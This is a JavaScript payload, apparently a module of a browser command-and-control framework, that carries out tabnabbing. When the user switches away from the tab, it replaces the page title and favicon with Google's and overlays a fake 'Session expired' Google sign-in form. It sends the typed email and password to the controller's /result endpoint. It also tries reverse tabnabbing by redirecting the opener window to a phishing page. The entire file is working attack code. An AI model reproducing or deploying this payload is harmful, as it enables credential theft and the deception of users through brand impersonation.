if (window.__pzTabNap) return 'already active';
window.__pzTabNap = { active: true, original: null };

var C2 = location.protocol + '//' + location.host;
var CID = window.__pzCid || '';

// ── Save original page state ─────────────────────────────────────────────────
var origTitle = document.title;
var origFavicon = '';
try {
  var fl = document.querySelector('link[rel*="icon"]');
  if (fl) origFavicon = fl.href;
} catch(e) {}
var origHTML = null; // lazy-captured on first hide

// ── Phishing page template (Gmail-style session expired) ─────────────────────
function buildPhishPage() {
  return '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:Google Sans,Roboto,Arial,sans-serif" id="__pzTNOverlay">'
    + '<div style="text-align:center;max-width:420px;padding:40px">'
    + '<svg width="75" height="24" viewBox="0 0 75 24"><text x="0" y="22" font-family="Product Sans,Arial" font-size="24" font-weight="bold"><tspan fill="#4285F4">G</tspan><tspan fill="#EA4335">o</tspan><tspan fill="#FBBC05">o</tspan><tspan fill="#4285F4">g</tspan><tspan fill="#34A853">l</tspan><tspan fill="#EA4335">e</tspan></text></svg>'
    + '<div style="margin:32px 0 8px;width:64px;height:64px;border-radius:50%;background:#f1f3f4;display:inline-flex;align-items:center;justify-content:center">'
    + '<svg width="32" height="32" fill="#5f6368" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>'
    + '</div>'
    + '<h2 style="font-size:24px;font-weight:400;color:#202124;margin:16px 0 8px">Session expired</h2>'
    + '<p style="color:#5f6368;font-size:14px;margin:0 0 24px">Your session has timed out. Please sign in again to continue.</p>'
    + '<input id="__pzTNemail" type="email" placeholder="Email" autocomplete="email" style="width:100%;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;margin-bottom:12px;outline:none;font-family:inherit">'
    + '<input id="__pzTNpass" type="password" placeholder="Password" autocomplete="current-password" style="width:100%;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;margin-bottom:24px;outline:none;font-family:inherit">'
    + '<button id="__pzTNbtn" style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer;font-family:inherit;width:100%">Sign in</button>'
    + '<p style="color:#5f6368;font-size:12px;margin:16px 0 0">This is required for security verification</p>'
    + '</div></div>';
}

// ── Switch to phishing mode ──────────────────────────────────────────────────
function activate() {
  if (!window.__pzTabNap.active) return;
  if (document.getElementById('__pzTNOverlay')) return;

  // Save current page state (first time only)
  if (!origHTML) origHTML = document.body.innerHTML;

  // Change title and favicon
  document.title = 'Google - Sign in';
  var link = document.querySelector('link[rel*="icon"]');
  if (!link) {
    link = document.createElement('link');
    link.rel = 'shortcut icon';
    document.head.appendChild(link);
  }
  link.href = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="%234285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="%2334A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/><path fill="%23FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="%23EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/></svg>';

  // Inject phishing overlay
  var div = document.createElement('div');
  div.innerHTML = buildPhishPage();
  document.body.appendChild(div.firstChild);

  // Handle credential capture
  setTimeout(function() {
    var btn = document.getElementById('__pzTNbtn');
    if (btn) btn.onclick = function() {
      var email = document.getElementById('__pzTNemail').value;
      var pass = document.getElementById('__pzTNpass').value;
      fetch(C2 + '/result', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cid: CID, cmd_id: 'tabnab_creds', result: { email: email, password: pass, url: location.href, timestamp: new Date().toISOString() } })
      }).catch(function(){});
      // Restore original page
      deactivate();
    };
    var em = document.getElementById('__pzTNemail');
    if (em) em.focus();
  }, 100);
}

// ── Restore original page ────────────────────────────────────────────────────
function deactivate() {
  document.title = origTitle;
  var link = document.querySelector('link[rel*="icon"]');
  if (link && origFavicon) link.href = origFavicon;
  var overlay = document.getElementById('__pzTNOverlay');
  if (overlay) overlay.remove();
}

// ── Visibility change listener ───────────────────────────────────────────────
document.addEventListener('visibilitychange', function() {
  if (document.hidden) {
    // User switched away — activate phishing after short delay
    setTimeout(activate, 800);
  }
  // We DON'T deactivate when they come back — the phishing page stays
  // until they enter creds or we manually remove it
});

// ── Reverse tabnabbing via window.opener ─────────────────────────────────────
// If this page was opened via target=_blank and has opener reference,
// redirect the opener to a phishing page
if (window.opener) {
  try {
    window.opener.location = C2 + '/phish?from=' + encodeURIComponent(location.href);
    fetch(C2 + '/result', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cid: CID, cmd_id: 'tabnab_reverse', result: { opener_redirected: true, from: location.href } })
    }).catch(function(){});
  } catch(e) {
    // Cross-origin opener — can't redirect
  }
}

return 'tab napper armed — phishing overlay activates when user switches tabs' + (window.opener ? ' + reverse tabnab attempted on opener' : '');
